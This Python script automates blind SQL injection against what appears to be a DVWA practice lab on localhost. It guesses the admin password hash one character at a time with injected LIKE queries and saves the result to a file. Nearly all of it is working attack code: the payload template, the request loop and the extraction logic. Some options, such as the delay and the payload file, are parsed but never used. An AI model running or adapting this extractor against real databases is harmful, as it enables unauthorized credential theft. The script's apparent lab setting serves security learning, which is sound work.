#!/usr/bin/env python3

import requests
import time
import argparse
from typing import List, Optional

# ------------------ CONFIG ------------------
base = "http://localhost"                # scheme + host
path = "/vulnerabilities/sqli_blind/"    # path (keep trailing slash if needed)

# You can override cookies/headers if needed
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "http://localhost/vulnerabilities/sqli_blind/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
}

cookies = {
    "PHPSESSID": "0h572nm0kpi01hhnv7nae0lbk1",
    "security": "low",
}

delay_between_requests = 0.5
timeout = 10


def build_payload(prefix: str, next_char: str) -> str:
    template = "' OR (SELECT password FROM users WHERE user_id = 1) LIKE '{p}{c}%';#"
    return template.format(p=prefix, c=next_char)


def send_payload(session: requests.Session, payload: str, print_body: bool = False) -> Optional[requests.Response]:
    params = {
        "id": payload,
        "Submit": "Submit"
    }
    req = requests.Request("GET", base + path, headers=headers, params=params, cookies=cookies)
    preq = session.prepare_request(req)

    try:
        resp = session.send(preq, timeout=timeout)
    except requests.RequestException as e:
        print("Request failed:", e)
        return None

    return resp


def blind_extract(session: requests.Session,
                  charset: str = "0123456789abcdef",
                  start_prefix: str = "",
                  delay: float = 0.5,
                  max_len: int = 64,
                  print_body: bool = False) -> str:
    
    found = start_prefix
    pos = len(found) + 1

    while len(found) < max_len:
        matched_char = None

        for c in charset:
            payload = build_payload(found, c)
            resp = send_payload(session, payload, print_body=print_body)
            if resp is None:
                print("Request error, skipping this character.")
                continue

            if resp.status_code == 200:
                matched_char = c
                print(f"--> Found character: {c!r} (prefix now: {found + c!s})")
                found += c
                break

        if matched_char is None:
            break

    print(f"\nPassword found: {found!r}")
    return found


def load_payloads_from_file(fn: str) -> List[str]:
    with open(fn, "r", encoding="utf-8") as f:
        lines = [ln.rstrip("\n\r") for ln in f]
    return [ln for ln in lines if ln and not ln.strip().startswith("#")]


def main():
    parser = argparse.ArgumentParser(description="Sniper-style blind SQL extractor")
    parser.add_argument("--payload-file", "-f", help="(Optional) file with payloads — not used by extractor flow here")
    parser.add_argument("--delay", "-d", type=float, default=delay_between_requests, help="Delay between requests (seconds).")
    parser.add_argument("--charset", "-c", type=str, default="0123456789abcdef", help="Characters to try (order matters).")
    parser.add_argument("--start-prefix", type=str, default="", help="Start with this known prefix (if you already know the first n chars).")
    parser.add_argument("--max-len", type=int, default=64, help="Maximum length to extract.")
    parser.add_argument("--no-print-body", action="store_true", help="Don't print response body snippets.")
    args = parser.parse_args()

    session = requests.Session()

    found = blind_extract(session=session,
                          charset=args.charset,
                          start_prefix=args.start_prefix,
                          delay=args.delay,
                          max_len=args.max_len,
                          print_body=(not args.no_print_body))

    try:
        with open("pass_pref.txt", "w", encoding="utf-8") as f:
            f.write(found)
        print("Password saved to pass_pref.txt")
    except Exception as e:
        print("Could not save result to file:", e)


if __name__ == "__main__":

    start_time = time.perf_counter() 
    main()
    end_time = time.perf_counter() 
    elapsed_time = end_time - start_time

    print(f"Elapsed time: {elapsed_time:.6f} seconds")
